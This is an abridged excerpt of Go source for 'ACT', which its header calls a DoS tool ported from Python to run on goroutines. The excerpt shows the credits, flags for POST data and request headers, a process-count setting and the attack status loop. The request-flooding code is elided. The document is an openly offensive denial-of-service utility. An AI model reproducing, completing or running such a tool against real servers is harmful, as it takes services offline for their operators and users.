...
/*
 ACT DoS tool on <strike>steroids</strike> goroutines. Just ported from Python with some improvements.
 Original Python utility by Barry Shteiman http://www.advancedcybertechbd.com/
 This go program licensed under GPLv3.
 Copyright 5PY_Z0N3 <advancedcybertechbd@gmail.com>
*/
...
func main() {
	...
	flag.StringVar(&data, "data", "", "Data to POST. If present ACT will use POST requests instead of GET")
	flag.Var(&headers, "header", "Add headers to the request. Could be used multiple times")
	flag.Parse()

	t := os.Getenv("ACTMAXPROCS")
	...
	go func() {
		fmt.Println("-- ACT Attack Started --\n           Go!\n\n")
		...
		for {
			...
			case targetComplete:
				sent++
				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
				fmt.Println("\r-- ACT Attack Finished --       \n\n\r")
				os.Exit(0)
			}
		}
	}()
